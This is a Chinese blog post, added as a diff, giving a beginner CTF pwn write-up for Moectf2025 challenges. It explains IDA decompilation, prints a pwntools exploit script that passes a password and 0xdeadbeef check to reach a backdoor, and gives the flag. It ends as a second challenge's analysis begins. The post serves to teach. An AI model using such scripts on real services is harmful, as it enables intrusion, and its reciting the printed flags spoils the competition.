@@ -1,0 +1,1113 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/76E788D4FCBABFED3D3EEC49B77753E5.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Koyanrush">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目来源：Moectf2025              温馨提示：确保有安装了至少一套Python的操作系统再来哦                          由于此类题目需要启动在线环境，所以不提供题目附件，需要请移步比赛平台哦             点我传送🖐️ 0 二进制漏洞审计入门指北这是一道入门题，我们可以通过这道题来初步了解pwn的流程。 在解题之前，拥有一个pwn解题环境">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF刷题-pwn（1）">
+<meta property="og:url" content="https://koyanrush.github.io/2026/02/03/Moectfpwn1/index.html">
+<meta property="og:site_name" content="Koyan&#39;s World">
+<meta property="og:description" content="题目来源：Moectf2025              温馨提示：确保有安装了至少一套Python的操作系统再来哦                          由于此类题目需要启动在线环境，所以不提供题目附件，需要请移步比赛平台哦             点我传送🖐️ 0 二进制漏洞审计入门指北这是一道入门题，我们可以通过这道题来初步了解pwn的流程。 在解题之前，拥有一个pwn解题环境">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20143749.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20143757.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20150534.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20144836.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20144821.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20225051.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20225105.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20225116.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20235032.png">
+<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-04%20001241.png">
+<meta property="article:published_time" content="2026-02-03T03:00:24.000Z">
+<meta property="article:modified_time" content="2026-02-03T16:13:24.747Z">
+<meta property="article:author" content="Koyanrush">
+<meta property="article:tag" content="网安之路">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20143749.png">
+  
+  
+  
+  <title>CTF刷题-pwn（1） - Koyan&#39;s World</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"koyanrush.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Koyan</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF刷题-pwn（1）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Koyanrush
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-03 11:00" pubdate>
+          2026年2月3日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF刷题-pwn（1）</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年2月4日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目来源：Moectf2025</p>
+<div class="note note-danger">
+            <p>温馨提示：确保有安装了至少一套Python的操作系统再来哦</p>
+          </div>
+
+<div class="note note-danger">
+            <p>由于此类题目需要启动在线环境，所以不提供题目附件，需要请移步比赛平台哦</p>
+          </div>
+
+<p><a href="https://ctf.xidian.edu.cn/" target="_blank">点我传送🖐️</a></p>
+<h2 id="0-二进制漏洞审计入门指北"><a href="#0-二进制漏洞审计入门指北" class="headerlink" title="0 二进制漏洞审计入门指北"></a>0 二进制漏洞审计入门指北</h2><p>这是一道入门题，我们可以通过这道题来初步了解pwn的流程。</p>
+<p>在解题之前，拥有一个pwn解题环境至关重要。题目附件的pdf中提供了相当全面的环境搭建建议，但对初学者而言难度较高，推荐边做边学。</p>
+<p>先尝试连接题目环境，正常来说用Linux环境是最好的，但由于题目使用WebSocket Reflector X（WSRX）连接，所以这里使用Windows环境进行演示。当然用WSL虚拟机什么的也是能连接的，只不过用Windows环境最简单。</p>
+<p>首先启动WSRX，来到题目平台启动在线环境，确保WSRX已连接。</p>
+<p>具体连接方式请阅读<a href="https://ctf.xidian.edu.cn/wiki/18" target="_blank">https://ctf.xidian.edu.cn/wiki/18</a>。</p>
+<p>记下出现的本地地址。比如127.0.0.1:11965。</p>
+<p>打开Windows PowerShell。输入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">pip install pwntools<br></code></pre></td></tr></table></figure>
+
+<p>没有pip？先输入这个👇</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">python <span class="hljs-literal">-m</span> ensurepip <span class="hljs-literal">--upgrade</span><br></code></pre></td></tr></table></figure>
+
+<p>然后你还需要一个nmap：</p>
+<p><a href="https://nmap.org/download.html" target="_blank">https://nmap.org/download.html</a></p>
+<p>安装时确保勾选了 Ncat 组件。</p>
+<p>不知道有没有的话，用以下命令确认</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">ncat <span class="hljs-literal">--version</span> <br>pwn version<br></code></pre></td></tr></table></figure>
+
+<p>如果都输出了版本号，就说明安装成功了。</p>
+<p>万事具备后，确保powershell在正确的目录生效：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell"><span class="hljs-built_in">cd</span> D:\hellopwn <span class="hljs-comment"># cd后面替换为你hellopwn的实际存放地址，这样才会对里面的pwn文件生效</span><br></code></pre></td></tr></table></figure>
+
+<p>然后输入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">ncat <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">11965</span><br></code></pre></td></tr></table></figure>
+
+<p>你会看到这样的输出</p>
+<div style="display: flex; justify-content: space-between; gap: 10px;">
+  <div style="flex: 1;">
+    <img src="/img/屏幕截图 2026-02-03 143749.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
+    <p style="text-align: center; font-size: 0.8em;"></p>
+  </div>
+  <div style="flex: 1;">
+    <img src="/img/屏幕截图 2026-02-03 143757.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
+    <p style="text-align: center; font-size: 0.8em;"></p>
+  </div>
+</div>
+
+<p>那一堆看着像中文的乱码应该是某类字符画（感觉是附件里的水箭龟）由于编码冲突而产生的，不影响解题，当不存在就好。</p>
+<p>看到</p>
+<p><strong>Guess who am i!</strong> </p>
+<p><strong>Before u answer me,solve some bypass function!</strong></p>
+<p><strong>First,you need to tell me the password.</strong></p>
+<p>这几条，就说明成功连接上题目了。</p>
+<p>但是这时候我们不知道password，这时候就要用到IDA了</p>
+<p><a href="https://hex-rays.com/" target="_blank">IDA pro以及free版获取地址</a></p>
+<p>富哥富姐们请无脑购买IDA pro，正版授权，功能强大，买不了吃亏买不了后悔。当然一般的pwn题目免费申请一个IDA Free也是够用的。</p>
+<p>在IDA打开pwn文件。按F5就可以看到程序反编译后的伪代码，这样我们就可以读懂破解逻辑</p>
+<figure>
+  <img src="/img/屏幕截图 2026-02-03 150534.png" srcset="/img/loading.gif" lazyload>
+  <figcaption>反编译在pwn和reverse都相当常用</figcaption>
+</figure>
+
+<p>在下面这个位置可以看到在打印出”First,you need to tell me the password.”这句之后，程序在等待用户输入一个整数并与全局变量 passwd 比较。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;First,you need to tell me the password.&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>  <span class="hljs-keyword">if</span> ( v4 != passwd )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Maybe you should recall what the password is!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>双击passwd变量，会自动定位到这一行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">.data:<span class="hljs-number">0000000000004010</span> passwd          dd <span class="hljs-number">1B</span>F4Fh               ; DATA XREF: main+CA↑r<br></code></pre></td></tr></table></figure>
+
+<p>所以passwd的值是1BF4Fh，也就是十六进制 0x1BF4F ，转换为十进制是 114511。</p>
+<p>然后是这里</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64u</span>); <br><span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)bypass(buf) ) &#123;<br>    backdoor();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>read函数读入了0x64个，也就是100个字节到buf，然后调用了bypass函数。如果bypass(buf)返回0，也就是if(!0)时，才会触发backdoor()。</p>
+<p>双击bypass看看怎么个事</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">bypass</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)a1 == <span class="hljs-number">-559038737</span> &amp;&amp; !<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a1 + <span class="hljs-number">4</span>), <span class="hljs-string">&quot;shuijiangui&quot;</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something wrong.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到有两种情况可以返回0：</p>
+<p>第一种：a1为空的时候。a1是输入缓冲区的起始地址，也是一个指针，在实际操作中，传入payload一定会被读入一个真实的内存地址，因此无论如何a1都不可能等于0 ，这条路走不通。</p>
+<p>第二种：需要同时满足两个条件。</p>
+<p>第一是<code>*(_DWORD \)a1 == -559038737</code>，这里的 <strong><code>*(_DWORD*)a1</code></strong> 意思是从缓冲区起始地址 a1 开始，往后连续抓取4个字节的内存数据（_DWORD 代表 Double Word，通常占4个字节）。也就是说要让引入的payload的前四字节为-559038737，换算成十六进制是<strong>0xDEADBEEF</strong>；</p>
+<p>第二个条件是<code>!strcmp((const char *)(a1 + 4), &quot;shuijiangui&quot;</code>，这个有点C语言基础就能看懂，意思是需要让payload从第五字节开始等于字符串<strong>shuijiangui</strong>。</p>
+<p>至于随后触发的backdoor，看名字就知道这就是获得隐藏信息的地方。</p>
+<p>至此我们已经摸透了题目逻辑，结合伪代码的结构，我们便能写出攻击脚本，保存为exp.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 由于是在 Windows 运行，可以不设 context.terminal</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># 1. 此时直接连接 WSRX 客户端显示的本地端口</span><br><span class="hljs-comment"># 请根据你 WSRX 界面上最新的蓝色数字修改端口号（例如 11965）</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">11965</span>) <br><br><span class="hljs-comment"># 2. 第一关：密码</span><br>p.recvuntil(<span class="hljs-string">b&quot;tell me the password.&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;114511&#x27;</span>) <span class="hljs-comment"># 密码 0x1BF4F 对应 114511</span><br><br><span class="hljs-comment"># 3. 等待缓冲</span><br>time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-comment"># 4. 第二关：Payload</span><br><span class="hljs-comment"># p32(0xdeadbeef) 对应 -559038737</span><br>payload = p32(<span class="hljs-number">0xdeadbeef</span>) + <span class="hljs-string">b&#x27;shuijiangui\x00&#x27;</span><br>p.send(payload)<br><br><span class="hljs-comment"># 5. 交互</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>之后在当前目录运行这个脚本。</p>
+<div style="display: flex; justify-content: space-between; gap: 10px;">
+  <div style="flex: 1;">
+    <img src="/img/屏幕截图 2026-02-03 144836.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
+    <p style="text-align: center; font-size: 0.8em;"></p>
+  </div>
+  <div style="flex: 1;">
+    <img src="/img/屏幕截图 2026-02-03 144821.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
+    <p style="text-align: center; font-size: 0.8em;"></p>
+  </div>
+</div>
+
+<p>可以看到出现了一堆DEBUG开头东西，那是pwntools框架执行产生的日志，不用管，直接翻到最下方就能找到flag。</p>
+<p>跟题目中提供的初始攻击脚本进行对比：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *                                    <span class="hljs-comment"># 导入 pwntools。</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <span class="hljs-comment"># 一些基本的配置。</span><br><br><span class="hljs-comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span><br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)             # 在本地运行程序。</span><br><span class="hljs-comment"># gdb.attach(io)                    # 启动 GDB</span><br>io = connect(???, ???)              <span class="hljs-comment"># 与在线环境交互。</span><br>io.sendline(<span class="hljs-string">b&#x27;114511&#x27;</span>)              <span class="hljs-comment"># 什么时候用 send 什么时候用 sendline？</span><br><br>payload  = p32(<span class="hljs-number">0xdeadbeef</span>)          <span class="hljs-comment"># p32(0xdeadbeef)、b&quot;\xde\xad\xbe\xef&quot;、b&quot;deadbeef&quot; 有什么区别？</span><br>                                    <span class="hljs-comment"># 你看懂原程序这里的检查逻辑了吗？</span><br>payload += <span class="hljs-string">b&#x27;shuijiangui&#x27;</span>           <span class="hljs-comment"># strcmp</span><br><br>io.sendafter(<span class="hljs-string">b&#x27;password.&#x27;</span>, payload) <span class="hljs-comment"># 发送！通过所有的检查。</span><br><br>io.interactive()                    <span class="hljs-comment"># 手动接收 flag。</span><br></code></pre></td></tr></table></figure>
+
+<p>回答里面的问题：</p>
+<p>sendline：会在发送的内容末尾自动加上一个换行符 \n。适用于程序使用 scanf 或 gets 等以换行符作为结束标志来读取数据的情况（如本题的第一关密码输入）。</p>
+<p>send：只发送原始字节，不附加任何字符。适用于程序使用 read(0, buf, size) 按字节长度读取的情况。在构造 Payload 绕过 bypass 函数时，使用 send 或 sendafter 更安全，因为多出的换行符可能会破坏精心构造的内存布局。</p>
+<p>p32(0xdeadbeef)：这是 Pwntools 的函数，它会将整数转换为对应的 4 字节原始字节流，并自动处理小端序（结果为 \xef\xbe\xad\xde）。这是本题最正确的写法。</p>
+<p>b”\xde\xad\xbe\xef”：这是 Python 的原始字节串表示法，虽然是字节形式，但它的顺序是大端序。除非目标机器是大端序，否则无法通过 *(_DWORD *)a1 &#x3D;&#x3D; -559038737 的检查。</p>
+<p>b”deadbeef”：这是个字符串，在内存中代表的是字符的 ASCII 码，跟 -559038737 完全不搭边。</p>
+<p><strong>moectf{tH3_B3gINnING-Of-FORMaT2493f9f50}</strong></p>
+<h2 id="1-ez-u64"><a href="#1-ez-u64" class="headerlink" title="1 ez_u64"></a>1 ez_u64</h2><p>依旧是一个pwn文件，先IDA反编译一下，得到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>只能看到一个vuln(),双击它看看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ya hello! Let&#x27;s play a game.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Guess which number I&#x27;m thinking of.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is the hint.&quot;</span>);<br>  write(<span class="hljs-number">1</span>, &amp;num, <span class="hljs-number">8u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt;&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%zu&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 != num )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong answer!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try pwntools u64?&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Win!&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28u</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>观察</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">write(<span class="hljs-number">1</span>, &amp;num, <span class="hljs-number">8u</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这是利用write函数在内存里抓取了全局变量num的8个字节的原始数据并输出为字节流，我们首先需要接收这个字节流。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">__isoc99_scanf(<span class="hljs-string">&quot;%zu&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 != num )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong answer!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try pwntools u64?&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>scanf函数等待的输入类型是%zu，意思是要你输入一串数字，它会转化成一个size_t大小的无符号整数储存到内存变量v1。至于size_t是多大，由于现在使用的是64位系统，所以占8个字节。</p>
+<p>随后会进行一次判断看是否和num相等，如果相等，会执行<code>system(&quot;/bin/sh&quot;)</code>,也就是会给你一个系统的控制权，这样我们就破解了这个程序，从而对它为所欲为。</p>
+<p>由于num的数据已经发送给我们了，只需要转换为数字形式发回去就可以。这时候就要用到pwntools里的u64，它可以将接收到的 8 字节原始数据转换回整数。这样做不仅方便，也避免了因为发送的原始数据是不可见字符导致无法识别的可能。</p>
+<p>好的，已经看穿了套路，是时候编写攻击脚本了！🧨</p>
